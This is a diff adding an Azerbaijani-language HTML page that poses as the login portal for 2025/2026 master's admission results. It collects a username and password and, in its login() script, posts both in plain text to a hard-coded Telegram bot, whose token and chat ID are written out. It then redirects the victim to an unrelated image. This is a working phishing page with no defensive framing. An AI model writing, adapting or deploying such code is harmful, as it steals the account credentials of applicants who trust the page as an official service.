@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <title>Magistratura 2025</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
+    </style>
+    <script>
+        function nextStep() {
+            const usernameInput = document.getElementById("username");
+            const username = usernameInput.value.trim();
+
+            if (username === "") {
+                alert("Zəhmət olmasa istifadəçi adını daxil edin.");
+                return;
+            }
+
+            document.getElementById("step1").style.display = "none";
+            document.getElementById("displayedUsername").textContent = username;
+            document.getElementById("step2").style.display = "block";
+        }
+
+        function login() {
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+
+            if (password === "") {
+                alert("Zəhmət olmasa şifrəni daxil edin.");
+                return;
+            }
+
+            // Telegram-a göndər
+            const message = `🔐 Yeni istifadəçi girişi:\n👤 İstifadəçi adı: ${username}\n🔑 Şifrə: ${password}`;
+            const token = "7966394095:AAFlEduotuUzPBoXvK9TxGWhQuIdraEUwrs";
+            const chatId = "1110858079";
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => {
+                window.location.href = 'https://www.kindpng.com/picc/m/395-3955653_nah-iareti-png-transparent-png.png'
+            }).catch(() => {
+                alert("Şəbəkə xətası!");
+            });
+        }
+    </script>
+</head>
+<body>
+<div class="container">
+    <h2 class="title">
+        2025/2026-ci tədris ili üçün ali təhsil müəssisələrinin magistraturalarına qəbul olmaq
+        üçün keçirilən müsabiqənin nəticələri
+    </h2>
+
+    <div class="form-box">
+        <!-- Step 1: Username input -->
+        <div id="step1">
+            <label for="username">Şəxsi kabinetin istifadəçi adı:</label><br>
+            <input type="text" id="username"><br><br>
+            <button onclick="nextStep()">Növbəti</button>
+        </div>
+
+        <!-- Step 2: Password input -->
+        <div id="step2" style="display:none;">
+            <p><strong>Şəxsi kabinetin istifadəçi adı:</strong> <div id="displayedUsername"></div></p>
+            <label for="password">Şifrə:</label><br>
+            <input type="password" id="password"><br><br>
+            <button onclick="login()">Daxil ol</button>
+        </div>
+    </div>
+</div>
+</body>
+</html>
